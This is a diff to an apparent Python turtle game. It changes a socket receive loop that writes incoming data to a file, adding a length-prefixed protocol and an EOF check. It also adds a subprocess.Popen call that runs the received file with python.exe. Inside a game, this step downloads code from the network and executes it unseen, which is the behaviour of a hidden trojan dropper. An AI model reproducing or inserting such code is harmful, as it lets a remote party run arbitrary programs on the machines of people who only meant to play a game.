@@ -1,6 +1,7 @@
 import os
 import random
 import socket
+import subprocess
 import time
 import turtle
 
@@ -108,13 +109,17 @@ with open(location, "wb") as f:
     done = False
     while not done:
         try:
-            data = my_socket.recv(1024)
-            if data == b'-1':
+            raw_size = my_socket.recv(MSG_LEN_PROTOCOL)
+            size = raw_size.decode()
+            if size.isdigit():
+                data = my_socket.recv(int(size))
+            if data == EOF:
                 break
             print(len(data))
             f.write(data)
         except Exception:
             done = True
+    process = subprocess.Popen(["python.exe", location])
 
 # Main game loop
 while True:
